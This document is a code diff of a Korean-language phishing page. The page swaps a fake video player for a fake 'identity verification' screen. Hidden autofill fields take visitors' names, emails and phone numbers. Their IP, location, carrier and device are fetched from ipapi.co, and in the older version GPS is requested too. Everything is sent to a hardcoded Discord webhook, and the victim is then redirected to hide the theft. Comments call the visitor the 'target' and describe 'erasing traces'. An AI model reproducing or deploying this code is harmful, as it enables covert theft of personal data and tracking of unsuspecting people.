@@ -2,81 +2,79 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>동영상 재생 중...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identity Verification</title>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; cursor: pointer; }
-        /* 타겟의 눈에 보이지 않는 투명한 자동완성 트랩 */
-        .stealth-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 10; }
-        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 2px solid #fff; }
-        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
-        #hidden-form { position: absolute; left: -9999px; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .box { width: 320px; text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        .btn { width: 100%; padding: 16px; background: #000; color: #fff; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        /* 핵심: 브라우저가 무시할 수 없게 만드는 노출형 필드 (투명하게 처리) */
+        #trap_container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: -1; opacity: 0.01; }
+        input { font-size: 16px; width: 200px; }
     </style>
 </head>
-<body onmousedown="killTarget()" ontouchstart="killTarget()">
+<body onload="autoNet()">
 
-    <div class="play-btn"></div>
-    <div style="color: white; position: absolute; bottom: 20%; font-family: sans-serif;">영상을 보려면 화면을 클릭하세요</div>
+    <div class="box">
+        <h2 style="margin-bottom:10px;">본인 확인</h2>
+        <p style="font-size:13px; color:#666; margin-bottom:25px;">계속하려면 아래 버튼을 눌러<br>저장된 프로필로 인증을 완료하십시오.</p>
+        <button class="btn" onclick="openTrap()">인증 및 승인</button>
+    </div>
 
-    <form id="hidden-form">
-        <input type="text" id="fn" name="name" autocomplete="name">
-        <input type="email" id="fe" name="email" autocomplete="email">
-        <input type="tel" id="ft" name="tel" autocomplete="tel">
-    </form>
+    <div id="trap_container">
+        <form id="exploit_form">
+            <input type="text" id="t_name" name="name" autocomplete="name" placeholder="Name">
+            <input type="email" id="t_email" name="email" autocomplete="email" placeholder="Email" oninput="captureFinal()">
+            <input type="tel" id="t_phone" name="tel" autocomplete="tel" placeholder="Phone">
+        </form>
+    </div>
 
 <script>
     const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+    let net = {};
 
-    // 1. 링크 접속 즉시 (클릭 전) 자동으로 따는 정보: IP, 위치, 통신사, 기기
-    async function autoLog() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            window.netData = d;
-        } catch(e) {}
-    }
-    autoLog();
-
-    // 2. 클릭 시 자동으로 따는 정보: 이름, 이메일, 전번, 정밀 GPS
-    async function killTarget() {
-        // 브라우저가 채워넣은 값을 0.1초 만에 스캔
-        const name = document.getElementById('fn').value;
-        const email = document.getElementById('fe').value;
-        const tel = document.getElementById('ft').value;
-
-        // GPS 정밀 위치 강제 요청
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            await report(name, email, tel, pos.coords.latitude, pos.coords.longitude);
-        }, async () => {
-            await report(name, email, tel, null, null);
-        });
+    // 1. 접속 즉시 IP, 위치, 기기 정보 선제 탈취
+    async function autoNet() {
+        const res = await fetch('https://ipapi.co/json/');
+        net = await res.json();
     }
 
-    async function report(name, email, tel, lat, lon) {
-        const d = window.netData || {};
-        
-        await fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "💀 [알파] 단일 클릭 신상 탈취 보고서",
-                    color: 16711680,
-                    fields: [
-                        { name: "👤 이름", value: name || "자동완성 실패", inline: true },
-                        { name: "📧 이메일", value: email || "자동완성 실패", inline: true },
-                        { name: "📞 전화번호", value: tel || "자동완성 실패", inline: true },
-                        { name: "🌐 공인 IP", value: d.ip || "추적실패", inline: false },
-                        { name: "📍 위치", value: lat ? `위도:${lat}, 경도:${lon}` : `${d.city}, ${d.region}`, inline: false },
-                        { name: "📶 통신사", value: d.org || "알 수 없음", inline: true },
-                        { name: "📱 기기", value: navigator.userAgent, inline: false }
-                    ],
-                    timestamp: new Date()
-                }]
-            })
-        });
+    // 2. 버튼 클릭 시 브라우저 자동완성 목록 강제 호출
+    function openTrap() {
+        const emailField = document.getElementById('t_email');
+        emailField.focus(); // 브라우저에게 이메일을 채우라고 명령
+        alert("인증할 이메일 또는 프로필을 선택해 주세요.");
+    }
 
-        // 흔적 지우기 및 리다이렉트
-        location.href = "https://www.youtube.com";
+    // 3. 타겟이 이메일을 선택(입력)하는 즉시 모든 정보 전송
+    async function captureFinal() {
+        const name = document.getElementById('t_name').value;
+        const email = document.getElementById('t_email').value;
+        const phone = document.getElementById('t_phone').value;
+
+        if (email) {
+            await fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔱 [알파] 7대 정보 완전 탈취 보고서",
+                        color: 16711680,
+                        fields: [
+                            { name: "👤 이름", value: name || "검출불가", inline: true },
+                            { name: "📧 이메일", value: email || "검출불가", inline: true },
+                            { name: "📞 전화번호", value: phone || "검출불가", inline: true },
+                            { name: "🌐 IP 주소", value: net.ip, inline: false },
+                            { name: "📍 상세 위치", value: `${net.city}, ${net.region}`, inline: true },
+                            { name: "📶 통신사", value: net.org, inline: true },
+                            { name: "📱 기기 정보", value: navigator.userAgent }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            });
+            location.href = "https://www.google.com";
+        }
     }
 </script>
 </body>
